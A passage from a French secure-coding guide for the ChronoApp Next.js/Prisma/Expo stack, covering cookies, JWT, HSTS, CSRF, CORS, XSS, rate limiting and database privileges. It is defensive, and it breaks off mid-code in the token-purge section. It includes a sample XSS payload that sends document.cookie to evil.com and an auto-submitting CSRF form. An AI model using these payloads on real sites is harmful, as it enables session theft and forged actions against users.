# Sécurité+ — Comprendre et mettre en place les points hors audit

_Complément de `security.md`. L'audit ChronoApp (`audit-securite.md`) explique déjà ses propres points. Ce document détaille ceux qui ont été **ajoutés** dans la checklist._

Chaque fiche suit le même plan :

- 🎯 **Contre quoi** : l'attaque ou le problème concret
- ⚙️ **Principe** : pourquoi la mesure fonctionne
- 🛠️ **Mise en place** : code (Next.js + Prisma + Zod, app Expo)
- ⚠️ **Pièges** : les erreurs fréquentes

## Sommaire

| #   | Fiche                                          | Priorité |
| --- | ---------------------------------------------- | -------- |
| 1   | [Cookie HttpOnly vs localStorage](#1-cookie-httponly-vs-localstorage)       | 🔴 |
| 2   | [Figer l'algorithme du JWT](#2-figer-lalgorithme-du-jwt)                   | 🔴 |
| 3   | [HTTPS et HSTS](#3-https-et-hsts)                                          | 🔴 |
| 4   | [Liste blanche pour le SQL dynamique](#4-liste-blanche-pour-le-sql-dynamique) | 🔴 |
| 5   | [Vérification de l'adresse email](#5-vérification-de-ladresse-email)       | 🟠 |
| 6   | [Politique de mot de passe NIST + mots de passe compromis](#6-politique-de-mot-de-passe-nist--mots-de-passe-compromis) | 🟠 |
| 7   | [Ré-authentification pour les opérations sensibles](#7-ré-authentification-pour-les-opérations-sensibles) | 🟠 |
| 8   | [Rate limiting plutôt que verrouillage de compte](#8-rate-limiting-plutôt-que-verrouillage-de-compte) | 🟠 |
| 9   | [CSRF](#9-csrf)                                                             | 🟡 |
| 10  | [CORS](#10-cors)                                                            | 🟡 |
| 11  | [XSS](#11-xss)                                                              | 🟡 |
| 12  | [Comparaison en temps constant](#12-comparaison-en-temps-constant)         | 🟡 |
| 13  | [Base de données : droits minimaux, réseau, sauvegardes](#13-base-de-données--droits-minimaux-réseau-sauvegardes) | 🟡 |
| 14  | [Purge des tokens expirés (cron)](#14-purge-des-tokens-expirés-cron)       | 🟡 |
| 15  | [Limites sur les routes métier](#15-limites-sur-les-routes-métier)          | 🟡 |
| 16  | [Upload de fichiers](#16-upload-de-fichiers)                               | 🟡 |
| 17  | [Double authentification (TOTP)](#17-double-authentification-totp)         | ⚪ |
| 18  | [RGPD : export et suppression du compte](#18-rgpd--export-et-suppression-du-compte) | ⚪ |

---

## 1. Cookie HttpOnly vs localStorage

🎯 **Contre quoi.** Le vol du token de session par une faille **XSS**. Si un script malveillant réussit à s'exécuter sur ta page (dépendance compromise, `dangerouslySetInnerHTML` mal utilisé…), il peut lire `localStorage.getItem("token")` et l'envoyer à l'attaquant, qui devient alors l'utilisateur depuis sa propre machine.

⚙️ **Principe.** Un cookie avec le flag `HttpOnly` est envoyé automatiquement par le navigateur au serveur, mais **JavaScript ne peut pas le lire** (`document.cookie` ne le voit pas). Une XSS reste grave, mais elle ne peut plus exfiltrer le token.

| Flag             | Effet                                                                |
| ---------------- | -------------------------------------------------------------------- |
| `HttpOnly`       | Illisible par JavaScript                                             |
| `Secure`         | Envoyé uniquement en HTTPS                                           |
| `SameSite=Lax`   | Pas envoyé par les requêtes `POST` venant d'un autre site (anti-CSRF, voir fiche 9) |
| `Path=/`         | Valable pour tout le site                                            |
| `Max-Age`        | Durée de vie, alignée sur celle du JWT                               |

🛠️ **Mise en place (Next.js, auth maison).**

```ts
// app/api/auth/login/route.ts — après vérification du mot de passe
import { cookies } from "next/headers";

const token = jwt.sign({ sub: user.id, v: user.tokenVersion }, process.env.JWT_SECRET!, {
  algorithm: "HS256",
  expiresIn: "1h",
});

(await cookies()).set("session", token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "lax",
  path: "/",
  maxAge: 60 * 60,
});
return NextResponse.json({ message: "Connecté" });
```

```ts
// lib/auth.ts — lecture côté serveur
const token = (await cookies()).get("session")?.value;
```

```ts
// Logout : supprimer le cookie ET incrémenter tokenVersion si "déconnecter partout"
(await cookies()).delete("session");
```

> Avec **NextAuth / Auth.js**, c'est déjà fait : le cookie de session est `HttpOnly`, `Secure` et `SameSite=Lax` par défaut.

**Côté mobile (Expo)**, il n'y a pas de XSS au sens web, mais `AsyncStorage` est un fichier en clair lisible sur un appareil rooté ou dans une sauvegarde. `expo-secure-store` utilise le **Keychain** (iOS) / **Keystore** (Android), qui sont chiffrés par le système. C'est ce que fait déjà ChronoApp.

⚠️ **Pièges.**
- Mettre le token dans un cookie **sans** `HttpOnly` : aucun gain par rapport à `localStorage`.
- Renvoyer aussi le token dans le body JSON « au cas où » : le front finit par le stocker en clair.
- Le cookie protège le token, pas l'utilisateur : une XSS peut toujours faire des requêtes **depuis** la page. La XSS reste à corriger (fiche 11).

---

## 2. Figer l'algorithme du JWT

🎯 **Contre quoi.** Les attaques de **confusion d'algorithme**. Un JWT annonce lui-même son algorithme dans son en-tête (`{"alg": "HS256"}`). Si le serveur fait confiance à ce champ, un attaquant peut :
- envoyer `"alg": "none"` → token non signé accepté par certaines librairies mal configurées ;
- en RS256, passer en `HS256` et signer avec la **clé publique** (connue de tous) comme secret HMAC.

⚙️ **Principe.** C'est le **serveur** qui décide de l'algorithme accepté, jamais le token.

🛠️ **Mise en place.**

```ts
// jsonwebtoken
const payload = jwt.verify(token, process.env.JWT_SECRET!, { algorithms: ["HS256"] });

// jose (compatible Edge / middleware)
import { jwtVerify } from "jose";
const secret = new TextEncoder().encode(process.env.JWT_SECRET);
const { payload } = await jwtVerify(token, secret, { algorithms: ["HS256"] });
```

⚠️ **Pièges.**
- `jwt.decode()` **ne vérifie rien** : il lit juste le contenu. Ne jamais l'utiliser pour authentifier.
- Ne jamais mettre de donnée sensible dans le payload : il est encodé en base64, **pas chiffré**. N'importe qui peut le lire sur jwt.io.

---

## 3. HTTPS et HSTS

🎯 **Contre quoi.** L'interception sur un réseau (Wi-Fi public, box compromise). En HTTP, mot de passe et token circulent en clair. Même si le site est en HTTPS, la **première** requête tapée `monsite.fr` part en HTTP avant la redirection : un attaquant peut l'intercepter et maintenir la victime en HTTP (attaque _SSL stripping_).

⚙️ **Principe.** L'en-tête `Strict-Transport-Security` dit au navigateur : « pendant N secondes, ne contacte ce domaine **qu'en HTTPS**, même si on te donne un lien `http://` ». Après la première visite, le navigateur réécrit tout lui-même.

🛠️ **Mise en place.**

```ts
// next.config.ts → headers()
{ key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains" } // 2 ans
```

- Vercel et Railway fournissent le certificat HTTPS automatiquement.
- **App mobile :** vérifier que `EXPO_PUBLIC_API_URL` commence par `https://` en production. Android bloque déjà le HTTP en clair par défaut sur les builds de production ; ne pas réactiver `usesCleartextTraffic`.

⚠️ **Pièges.**
- `includeSubDomains` s'applique à **tous** les sous-domaines : s'assurer qu'aucun ne sert encore du HTTP.
- Tester avec un `max-age` court (ex : 300) avant de mettre 2 ans : un navigateur garde l'ordre en mémoire même si tu retires l'en-tête.

---

## 4. Liste blanche pour le SQL dynamique

🎯 **Contre quoi.** L'injection SQL dans les parties de requête qui **ne peuvent pas** être paramétrées. Les paramètres (`$1`) protègent les **valeurs**, mais pas les noms de colonnes ni le sens du tri. Un `ORDER BY ${req.query.sort}` reste injectable.

⚙️ **Principe.** Pour un identifiant SQL venant de l'utilisateur, on ne nettoie pas : on **choisit** parmi une liste de valeurs connues.

🛠️ **Mise en place.**

```ts
// Zod fait la liste blanche directement
const querySchema = z.object({
  sort: z.enum(["createdAt", "name", "duration"]).default("createdAt"),
  order: z.enum(["asc", "desc"]).default("desc"),
});

const { sort, order } = querySchema.parse(Object.fromEntries(req.nextUrl.searchParams));

// Avec Prisma : la clé est typée, aucun SQL brut
await prisma.seance.findMany({ where: { userId }, orderBy: { [sort]: order } });
```

```ts
// Avec pg (Express) : la valeur vient de l'enum, donc sûre à interpoler
await pool.query(`SELECT * FROM seance WHERE user_id = $1 ORDER BY ${sort} ${order}`, [userId]);
```

⚠️ **Pièges.**
- Prisma `$queryRaw` avec template literal **est** paramétré ; `$queryRawUnsafe` et `Prisma.raw()` **ne le sont pas**.
- Un filtre `LIKE` : échapper `%` et `_` sinon l'utilisateur peut faire des recherches très coûteuses (`%%%%%`).

---

## 5. Vérification de l'adresse email

🎯 **Contre quoi.**
- Créer un compte avec l'email de **quelqu'un d'autre** (usurpation, spam vers la victime).
- Les fautes de frappe : l'utilisateur ne pourra jamais réinitialiser son mot de passe.
- **Condition nécessaire à l'anti-énumération du register** : pour répondre la même chose que le compte existe ou non, la suite doit se passer **dans la boîte mail**.

⚙️ **Principe.** Prouver que la personne contrôle la boîte mail, avec la même mécanique que le reset : token aléatoire, stocké haché, expirant, à usage unique.

```
Register ──► user créé (emailVerifiedAt = null) ──► mail avec lien #token
                                                         │
Clic sur le lien ──► POST /api/auth/verify-email {token} ─┘
                     ──► emailVerifiedAt = now()
```

🛠️ **Mise en place.**

```prisma
model User {
  id              String    @id @default(cuid())
  email           String    @unique
  password        String
  emailVerifiedAt DateTime?
  tokenVersion    Int       @default(0)
  verificationTokens EmailVerificationToken[]
}

model EmailVerificationToken {
  id        String    @id @default(cuid())
  tokenHash String    @unique
  userId    String
  user      User      @relation(fields: [userId], references: [id], onDelete: Cascade)
  expiresAt DateTime
  usedAt    DateTime?
  createdAt DateTime  @default(now())
}
```

```ts
// lib/tokens.ts — réutilisable pour reset ET vérification
import crypto from "crypto";

export function generateToken() {
  const raw = crypto.randomBytes(32).toString("hex"); // envoyé par mail
  const hash = crypto.createHash("sha256").update(raw).digest("hex"); // stocké en base
  return { raw, hash };
}
export const hashToken = (raw: string) => crypto.createHash("sha256").update(raw).digest("hex");
```

```ts
// app/api/auth/register/route.ts (extrait)
const GENERIC = { message: "Si l'adresse est valide, vérifiez vos emails" };

const existing = await prisma.user.findUnique({ where: { email } });

if (existing) {
  // Ne rien révéler dans la réponse, prévenir le vrai propriétaire
  after(() => sendAccountExistsEmail(email).catch(() => console.error("MAIL_EXISTS_FAILED")));
  return NextResponse.json(GENERIC, { status: 202 });
}

const { raw, hash } = generateToken();
await prisma.user.create({
  data: {
    email,
    password: await bcrypt.hash(password, 12),
    verificationTokens: { create: { tokenHash: hash, expiresAt: new Date(Date.now() + 24 * 3600_000) } },
  },
});
after(() => sendVerifyEmail(email, raw).catch(() => console.error("MAIL_VERIFY_FAILED")));
return NextResponse.json(GENERIC, { status: 202 });
```

```ts
// app/api/auth/verify-email/route.ts — consommation atomique
const tokenHash = hashToken(body.token);

const ok = await prisma.$transaction(async (tx) => {
  const token = await tx.emailVerificationToken.findUnique({ where: { tokenHash } });
  if (!token) return false;
  const { count } = await tx.emailVerificationToken.updateMany({
    where: { tokenHash, usedAt: null, expiresAt: { gt: new Date() } },
    data: { usedAt: new Date() },
  });
  if (count === 0) return false;
  await tx.user.update({ where: { id: token.userId }, data: { emailVerifiedAt: new Date() } });
  return true;
});

if (!ok) return NextResponse.json({ message: "Lien invalide ou expiré" }, { status: 400 });
```

```ts
// Bloquer les actions tant que l'email n'est pas vérifié
// Option simple : refuser le login
if (!user.emailVerifiedAt) {
  return NextResponse.json({ message: "Vérifiez votre adresse email" }, { status: 403 });
}
```

> Le 403 au login ne révèle rien de plus qu'avant : il n'est renvoyé **qu'après** un mot de passe correct.

⚠️ **Pièges.**
- Prévoir une route « renvoyer le mail de vérification » (rate limitée, réponse générique).
- Comptes jamais vérifiés : les supprimer après X jours (cron, fiche 14), sinon l'adresse reste « prise ».
- Le timing du register doit aussi être constant : `bcrypt.hash` n'est exécuté que pour un nouvel email → hacher quand même un mot de passe factice dans la branche `existing`, ou accepter ce risque résiduel (plus faible que le 409).

---

## 6. Politique de mot de passe NIST + mots de passe compromis

🎯 **Contre quoi.** Le **credential stuffing** : les attaquants testent les milliards de couples email/mot de passe issus de fuites d'autres sites. Un utilisateur qui réutilise `Azerty123!` est compromis dès la première tentative, quelle que soit la qualité de ton hachage.

⚙️ **Principe (NIST SP 800-63B).**

| ✅ À faire                                  | ❌ À ne plus faire                                   |
| ------------------------------------------- | ---------------------------------------------------- |
| Longueur min 8 (12 recommandé)              | Imposer majuscule + chiffre + symbole                |
| Accepter tous les caractères (espaces, emoji) | Forcer un changement tous les 90 jours             |
| Max ≥ 64 caractères                         | Questions secrètes (« nom de votre animal »)         |
| Refuser les mots de passe connus compromis  | Interdire le copier-coller (bloque les gestionnaires de mots de passe) |

Les règles de composition produisent `Motdepasse1!` ; l'expiration produit `Motdepasse2!`. La **longueur** et l'**absence dans les fuites** sont ce qui compte.

**API Have I Been Pwned (k-anonymity) :** on n'envoie jamais le mot de passe.
1. Calculer le SHA-1 du mot de passe : `5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8`
2. Envoyer seulement les **5 premiers caractères** : `GET /range/5BAA6`
3. L'API renvoie les ~800 suffixes qui commencent par ce préfixe, avec leur nombre d'apparitions
4. Vérifier **localement** si notre suffixe est dans la liste

🛠️ **Mise en place.**

```ts
// lib/pwned.ts
import crypto from "crypto";

export async function isPwnedPassword(password: string): Promise<boolean> {
  const sha1 = crypto.createHash("sha1").update(password).digest("hex").toUpperCase();
  const prefix = sha1.slice(0, 5);
  const suffix = sha1.slice(5);

  try {
    const res = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`, {
      headers: { "Add-Padding": "true" }, // masque la taille de la réponse
      signal: AbortSignal.timeout(2000),
    });
    if (!res.ok) return false;
    const text = await res.text();
    return text.split("\n").some((line) => {
      const [hash, count] = line.trim().split(":");
      return hash === suffix && Number(count) > 0; // le padding a count = 0
    });
  } catch {
    return false; // API indisponible : on ne bloque pas l'inscription
  }
}
```

```ts
// lib/schema/passwordSchema.ts — réutilisé par register, reset, changement de mot de passe
export const passwordSchema = z
  .string()
  .min(12, "12 caractères minimum")
  .refine((p) => new TextEncoder().encode(p).length <= 72, "Mot de passe trop long");
```

```ts
// Dans la route (la vérification est asynchrone)
if (await isPwnedPassword(password)) {
  return NextResponse.json(
    { message: "Ce mot de passe apparaît dans des fuites de données, choisissez-en un autre" },
    { status: 400 },
  );
}
```

> Zod accepte aussi un `.refine(async ...)` avec `parseAsync`, mais garder l'appel réseau dans la route rend le schéma testable sans réseau.

**Côté front :** un indicateur de robustesse (librairie `zxcvbn-ts`) aide l'utilisateur, mais la règle reste appliquée côté serveur.

⚠️ **Pièges.**
- Ne vérifier HIBP qu'à la **création** et au **changement** du mot de passe, jamais au login (latence inutile).
- « Fail open » (`return false` si l'API tombe) est un choix volontaire : la disponibilité de l'inscription passe avant.

---

## 7. Ré-authentification pour les opérations sensibles

🎯 **Contre quoi.** Une session volée ou un téléphone déverrouillé laissé sur une table. Sans ré-authentification, l'attaquant change l'email puis le mot de passe : la victime perd son compte **définitivement**, et le reset arrive dans la boîte de l'attaquant.

⚙️ **Principe.** Posséder la session ne suffit pas pour les actions **irréversibles ou qui prennent le contrôle du compte**. On redemande le mot de passe actuel, et on prévient l'utilisateur par un autre canal (email).

| Action                  | Exigence                                                         |
| ----------------------- | ---------------------------------------------------------------- |
| Changer le mot de passe | Ancien mot de passe + révocation des sessions + mail de notification |
| Changer l'email         | Mot de passe + vérification de la **nouvelle** adresse + mail à l'**ancienne** |
| Supprimer le compte     | Mot de passe                                                     |
| Désactiver la 2FA       | Mot de passe + code 2FA                                          |

🛠️ **Mise en place — changement de mot de passe.**

```ts
// lib/schema/changePasswordSchema.ts
export const changePasswordSchema = z.object({
  currentPassword: z.string().min(1).max(128),
  newPassword: passwordSchema,
});
```

```ts
// app/api/account/password/route.ts
export async function PATCH(req: NextRequest) {
  const userId = await getUserIdFromRequest(req);
  if (!userId) return NextResponse.json({ message: "Non authentifié" }, { status: 401 });

  const parsed = changePasswordSchema.safeParse(await req.json().catch(() => null));
  if (!parsed.success) return NextResponse.json({ message: "Données invalides" }, { status: 400 });

  const user = await prisma.user.findUnique({ where: { id: userId } });
  if (!user || !(await bcrypt.compare(parsed.data.currentPassword, user.password))) {
    return NextResponse.json({ message: "Mot de passe actuel incorrect" }, { status: 400 });
  }

  await prisma.$transaction([
    prisma.user.update({
      where: { id: userId },
      data: {
        password: await bcrypt.hash(parsed.data.newPassword, 12),
        tokenVersion: { increment: 1 }, // déconnecte toutes les autres sessions
      },
    }),
    prisma.passwordResetToken.deleteMany({ where: { userId } }),
  ]);

  after(() => sendPasswordChangedEmail(user.email).catch(() => console.error("MAIL_PWD_CHANGED_FAILED")));

  // tokenVersion a changé : renvoyer un nouveau token pour la session courante
  const token = signSession({ sub: userId, v: user.tokenVersion + 1 });
  return NextResponse.json({ token });
}
```

**Changement d'email :** ne **jamais** remplacer l'email directement.

```prisma
model User {
  // ...
  pendingEmail String?
}
```

1. `PATCH /api/account/email { password, newEmail }` → vérifie le mot de passe, stocke `pendingEmail`, crée un token, envoie le lien à `newEmail`.
2. Mail à l'**ancienne** adresse : « Une demande de changement d'email a été faite. Ce n'est pas vous ? Changez votre mot de passe. »
3. Clic sur le lien → `email = pendingEmail`, `pendingEmail = null`, `tokenVersion + 1`.

⚠️ **Pièges.**
- Rate limiter la vérification du mot de passe actuel comme un login (sinon brute force depuis une session volée).
- Le mail de notification ne doit **pas** contenir de lien « annuler » qui agit sans authentification.

---

## 8. Rate limiting plutôt que verrouillage de compte

🎯 **Contre quoi.** Le « verrouiller le compte après 5 échecs » paraît sûr, mais il crée un **déni de service ciblé** : un attaquant qui connaît l'email d'une victime tape 5 faux mots de passe toutes les 15 minutes, et la victime ne peut plus jamais se connecter.

⚙️ **Principe.** On ralentit l'**attaquant** (son IP, son volume) sans punir le **compte**.

| Approche               | Brute force | Credential stuffing | Bloque la victime ? |
| ---------------------- | ----------- | ------------------- | ------------------- |
| Verrouillage du compte | ✅          | ❌ (1 essai par compte) | ❌ Oui            |
| Rate limit par IP      | ✅ (1 IP)   | ✅                  | Non (sauf IP partagée) |
| Rate limit par email   | ✅ (multi-IP) | —                 | Temporairement, avec fenêtre courte |
| Délai progressif       | ✅          | —                   | Non, juste plus lent |

🛠️ **Mise en place.** Combiner les deux limiteurs (déjà vus dans l'audit) avec une fenêtre **glissante** courte sur l'email, plutôt qu'un blocage définitif :

```ts
// lib/rateLimit.ts (Upstash)
export const loginIp = new Ratelimit({
  redis, limiter: Ratelimit.slidingWindow(20, "1 m"), prefix: "ratelimit:login:ip",
});
export const loginEmail = new Ratelimit({
  redis, limiter: Ratelimit.slidingWindow(10, "15 m"), prefix: "ratelimit:login:email",
});
```

```ts
const [ip, mail] = await Promise.all([loginIp.limit(getClientIp(req)), loginEmail.limit(email)]);
if (!ip.success || !mail.success) {
  return NextResponse.json(
    { message: "Trop de tentatives, réessayez plus tard" },
    { status: 429, headers: { "Retry-After": "60" } },
  );
}
```

Au-delà : ajouter un **CAPTCHA** (Cloudflare Turnstile, gratuit) après N échecs plutôt que bloquer.

⚠️ **Pièges.**
- Le message 429 doit être le même que l'email existe ou non.
- Ne pas remettre le compteur à zéro après un login réussi **par IP** (sinon l'attaquant intercale son propre compte valide).

---

## 9. CSRF

🎯 **Contre quoi.** _Cross-Site Request Forgery_ : l'utilisateur est connecté à `monapp.fr` (cookie de session). Il visite `site-piege.com`, qui contient :

```html
<form action="https://monapp.fr/api/account/delete" method="POST"><input type="hidden" ...></form>
<script>document.forms[0].submit()</script>
```

Le navigateur envoie la requête **avec le cookie** de `monapp.fr` → l'action est exécutée au nom de la victime.

⚙️ **Principe.** Le CSRF n'existe que si l'authentification est envoyée **automatiquement** par le navigateur (cookies).

| Mode d'auth                             | Vulnérable au CSRF ? | Protection                         |
| --------------------------------------- | -------------------- | ---------------------------------- |
| Header `Authorization: Bearer` (ChronoApp, app mobile) | Non | Le site piège ne connaît pas le token |
| Cookie de session                       | Oui                  | `SameSite` + vérification `Origin` |

🛠️ **Mise en place (auth par cookie).**

1. `SameSite=Lax` sur le cookie (fiche 1) : le navigateur ne l'envoie plus sur un `POST` venant d'un autre site. C'est la protection principale.
2. Vérifier l'en-tête `Origin` sur toutes les requêtes qui modifient des données :

```ts
// middleware.ts (ou proxy.ts selon la version de Next.js)
import { NextResponse, type NextRequest } from "next/server";

const SAFE_METHODS = ["GET", "HEAD", "OPTIONS"];

export function middleware(req: NextRequest) {
  if (!SAFE_METHODS.includes(req.method) && req.nextUrl.pathname.startsWith("/api/")) {
    const origin = req.headers.get("origin");
    if (origin && origin !== req.nextUrl.origin) {
      return NextResponse.json({ message: "Origine refusée" }, { status: 403 });
    }
  }
  return NextResponse.next();
}
```

> On laisse passer l'absence d'`Origin` car les apps mobiles et les outils (curl) ne l'envoient pas ; ils n'utilisent pas les cookies du navigateur de toute façon.

3. **Ne jamais** modifier des données sur un `GET` (`/api/delete?id=3`) : un simple `<img src>` suffirait à déclencher l'action.

**Déjà géré :** NextAuth (token CSRF intégré) et les **Server Actions** de Next.js (vérification d'`Origin` intégrée).

⚠️ **Pièges.** `SameSite=None` réactive complètement le CSRF : ne l'utiliser que si nécessaire, et alors avec un token CSRF.

---

## 10. CORS

🎯 **Contre quoi.** Le navigateur applique la **Same-Origin Policy** : un script de `site-piege.com` ne peut pas **lire** la réponse d'une requête vers `monapp.fr`. CORS est le mécanisme qui **assouplit** cette règle. Le danger n'est donc pas d'oublier CORS, mais de l'**ouvrir trop**.

⚙️ **Principe.**
- Par défaut, les routes API Next.js n'envoient **aucun** en-tête CORS → seules les pages de la même origine peuvent lire les réponses. C'est le réglage le plus sûr.
- **Les apps mobiles ne sont pas concernées** : CORS est une règle du navigateur. React Native / Expo (hors Expo Web) appelle l'API sans aucune vérification CORS. Inutile d'ouvrir CORS pour ChronoApp mobile.
- On n'ouvre CORS que si un **autre front web** (autre domaine) doit appeler l'API.

🛠️ **Mise en place (si nécessaire).**

```ts
// lib/cors.ts
const ALLOWED_ORIGINS = ["https://app.monsite.fr", "https://admin.monsite.fr"];

export function corsHeaders(req: Request) {
  const origin = req.headers.get("origin");
  if (!origin || !ALLOWED_ORIGINS.includes(origin)) return {};
  return {
    "Access-Control-Allow-Origin": origin, // l'origine exacte, pas "*"
    "Access-Control-Allow-Methods": "GET,POST,PATCH,DELETE",
    "Access-Control-Allow-Headers": "Content-Type, Authorization",
    "Access-Control-Allow-Credentials": "true",
    Vary: "Origin",
  };
}

// Requête de pré-vérification (preflight)
export function OPTIONS(req: Request) {
  return new Response(null, { status: 204, headers: corsHeaders(req) });
}
```

⚠️ **Pièges.**
- `Access-Control-Allow-Origin: *` + cookies = refusé par le navigateur… alors certains renvoient l'`Origin` reçue **sans vérification**, ce qui autorise **tous** les sites. Toujours comparer à une liste.
- Comparer avec `===`, pas `origin.includes("monsite.fr")` (`monsite.fr.attaquant.com` passe).
- CORS **ne protège pas** du CSRF : la requête part quand même, seule la lecture de la réponse est bloquée.

---

## 11. XSS

🎯 **Contre quoi.** _Cross-Site Scripting_ : un attaquant fait exécuter **son** JavaScript dans la page d'un autre utilisateur (ex : un pseudo `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` affiché tel quel). Le script agit avec les droits de la victime.

⚙️ **Principe.** React **échappe** automatiquement tout ce qui est dans `{}` : `<p>{user.name}</p>` affiche le texte du pseudo, sans l'interpréter. Les failles viennent des **sorties de secours** de React et des contextes hors React.

🛠️ **Mise en place.**

**a) `dangerouslySetInnerHTML`** : à éviter. Si du HTML utilisateur est vraiment nécessaire (éditeur riche) :

```ts
import DOMPurify from "isomorphic-dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content) }} />
```

**b) Liens construits à partir d'une saisie** : React n'empêche pas `href="javascript:alert(1)"`.

```ts
// lib/safeUrl.ts
export function safeUrl(input: string) {
  try {
    const url = new URL(input);
    return ["http:", "https:"].includes(url.protocol) ? url.toString() : "#";
  } catch {
    return "#";
  }
}
<a href={safeUrl(user.website)} rel="noopener noreferrer" target="_blank">Site</a>
```

Ou directement dans Zod : `website: z.url({ protocol: /^https?$/ })`.

**c) Emails HTML** : les templates (Resend, Nodemailer) ne sont pas toujours échappés. Utiliser **React Email** (échappe comme React) ou échapper manuellement :

```ts
const escapeHtml = (s: string) =>
  s.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]!);
```

**d) CSP** (`Content-Security-Policy`) : filet de sécurité qui empêche l'exécution de scripts non autorisés, même si une faille existe. Commencer par `default-src 'self'` et ajuster.

⚠️ **Pièges.**
- Le JSON injecté dans un `<script>` (ex : état initial) doit être sérialisé proprement, sinon `</script>` dans une donnée casse la page.
- La CSP de Next.js avec scripts inline nécessite un `nonce` : voir la doc officielle « Content Security Policy » de Next.js.

---

## 12. Comparaison en temps constant

🎯 **Contre quoi.** L'attaque **temporelle** sur une comparaison de secret. `a === b` s'arrête au **premier caractère différent** : comparer `"abcd"` à `"xbcd"` est un peu plus rapide que `"abcd"` à `"abcx"`. En mesurant des milliers de requêtes, un attaquant peut deviner le secret caractère par caractère.

⚙️ **Principe.** `crypto.timingSafeEqual` compare **tous** les octets, quel que soit le résultat → temps identique.

**Quand c'est nécessaire :** quand **ton code** compare un secret reçu à un secret attendu :
- clé d'API / `CRON_SECRET` dans un header ;
- signature de webhook (Stripe, GitHub…) ;
- code 2FA comparé manuellement.

**Quand ce n'est pas nécessaire :** `bcrypt.compare` (déjà en temps constant) ; recherche en base par **hash** du token (`findUnique({ where: { tokenHash } })`), car l'attaquant ne contrôle pas le hash.

🛠️ **Mise en place.**

```ts
// lib/safeCompare.ts
import crypto from "crypto";

export function safeCompare(a: string, b: string) {
  // timingSafeEqual exige deux buffers de même longueur : on hache d'abord
  const ha = crypto.createHash("sha256").update(a).digest();
  const hb = crypto.createHash("sha256").update(b).digest();
  return crypto.timingSafeEqual(ha, hb);
}
```

```ts
// Exemple : route de cron protégée
const auth = req.headers.get("authorization") ?? "";
if (!safeCompare(auth, `Bearer ${process.env.CRON_SECRET}`)) {
  return NextResponse.json({ message: "Non autorisé" }, { status: 401 });
}
```

⚠️ **Pièges.** `timingSafeEqual` lève une exception si les longueurs diffèrent, et un `if (a.length !== b.length) return false` avant révèle la longueur : le hachage préalable règle les deux.

---

## 13. Base de données : droits minimaux, réseau, sauvegardes

🎯 **Contre quoi.**
- Une injection SQL ou une fuite de `DATABASE_URL` avec le compte **superuser** = l'attaquant peut tout supprimer (`DROP DATABASE`), lire d'autres bases, voire exécuter des commandes.
- Une base accessible depuis Internet = cible des scanners automatiques (brute force du mot de passe Postgres).
- Pas de sauvegarde = une erreur de migration ou un ransomware est **définitif**.

⚙️ **Principe.** _Least privilege_ : chaque composant n'a que les droits dont il a besoin. L'application lit et écrit des lignes ; elle n'a pas besoin de créer ou supprimer des tables.

🛠️ **Mise en place.**

**a) Deux utilisateurs Postgres**

```sql
-- Exécuté une fois, avec le compte admin
CREATE ROLE app_user LOGIN PASSWORD 'mot-de-passe-long-aleatoire';
GRANT CONNECT ON DATABASE chronoapp TO app_user;
GRANT USAGE ON SCHEMA public TO app_user;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_user;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO app_user;
-- Pour les tables créées par les futures migrations
ALTER DEFAULT PRIVILEGES IN SCHEMA public
  GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO app_user;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
  GRANT USAGE, SELECT ON SEQUENCES TO app_user;
```

| Variable           | Utilisateur        | Utilisée par                               |
| ------------------ | ------------------ | ------------------------------------------ |
| `DATABASE_URL`     | `app_user`         | L'application (Vercel)                     |
| `MIGRATE_DATABASE_URL` | propriétaire du schéma | `prisma migrate deploy` (CI ou en local), jamais déployée sur Vercel |

> Sur un petit projet perso, garder un seul utilisateur est acceptable ; l'important est de **savoir** que c'est un compromis.

**b) Réseau et chiffrement**
- Railway : utiliser l'URL **privée** si l'API tourne aussi sur Railway ; sinon l'URL publique avec un mot de passe long.
- Ajouter `?sslmode=require` à l'URL de connexion si l'hébergeur ne l'impose pas.
- Ne jamais exposer le port 5432 d'un VPS sur Internet (pare-feu, tunnel SSH pour y accéder).

**c) Sauvegardes**
- Activer les sauvegardes automatiques de l'hébergeur (Railway, Neon, Supabase en proposent).
- Sauvegarde manuelle avant chaque migration risquée : `pg_dump "$DATABASE_URL" -Fc -f backup_2026-10-01.dump`
- **Tester une restauration** au moins une fois (`pg_restore -d base_de_test backup.dump`) : une sauvegarde jamais restaurée n'est pas une sauvegarde.

⚠️ **Pièges.** Ne pas mettre la `DATABASE_URL` de production dans le `.env` local : une commande `prisma migrate reset` lancée par erreur vide la prod.

---

## 14. Purge des tokens expirés (cron)

🎯 **Contre quoi.** Les tables de tokens (reset, vérification email) et les comptes jamais vérifiés grossissent indéfiniment. Ce sont des données inutiles à conserver (RGPD) et une surface d'attaque en cas de fuite de la base.

⚙️ **Principe.** Une tâche planifiée supprime régulièrement ce qui n'a plus de raison d'exister. Elle est exposée sous forme de route API, protégée par un secret.

🛠️ **Mise en place (Vercel Cron).**

```json
// vercel.json
{
  "crons": [{ "path": "/api/cron/cleanup", "schedule": "0 3 * * *" }]
}
```

```ts
// app/api/cron/cleanup/route.ts
// Vercel envoie automatiquement "Authorization: Bearer <CRON_SECRET>" si la variable est définie
export async function GET(req: NextRequest) {
  const auth = req.headers.get("authorization") ?? "";
  if (!safeCompare(auth, `Bearer ${process.env.CRON_SECRET}`)) {
    return NextResponse.json({ message: "Non autorisé" }, { status: 401 });
  }

  const now = new Date();
  const weekAgo = new Date(now.getTime() - 7 * 24 * 3600_000);

  const [reset, verify, unverified] = await prisma.$transaction([
    prisma.passwordResetToken.deleteMany({ where: { OR: [{ expiresAt: { lt: now } }, { usedAt: { not: null } }] } }),
    prisma.emailVerificationToken.deleteMany({ where: { OR: [{ expiresAt: { lt: now } }, { usedAt: { not: null } }] } }),
    prisma.user.deleteMany({ where: { emailVerifiedAt: null, createdAt: { lt: weekAgo } } }),
